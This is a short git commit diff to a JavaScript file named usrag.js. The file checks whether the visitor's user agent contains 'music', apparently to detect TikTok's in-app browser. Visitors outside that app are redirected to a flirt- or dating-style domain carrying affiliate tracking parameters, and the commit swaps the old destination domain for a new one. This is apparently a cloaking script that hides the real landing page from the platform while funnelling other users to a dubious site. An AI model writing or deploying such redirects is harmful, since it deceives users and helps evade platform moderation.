54701ab33780146f23866b864d0aa1d1f75351da
fixyourself2024 <Shaiji16@gmail.com>
2024-08-23 23:47:34 +0300

    Update usrag.js

--- usrag.js
+++ usrag.js
@@ -3,7 +3,7 @@ let agent = navigator.userAgent;
 if (agent.indexOf('music') >= 0) {
   console.log('in tiktok app');
 } else {
-  window.location = 'https://lovelighthaven.life/?u=rudktec&o=9kwpyhg';
-//  window.location = 'https://lovelighthaven.life/?u=rudktec&o=9kwpyhg';
+  window.location = 'https://theyoursweetflirt.one/?u=rudktec&o=9kgp9mx';
+//  window.location = 'https://theyoursweetflirt.one/?u=rudktec&o=9kgp9mx';
 }
 // document.querySelector('body').innerText = agent;
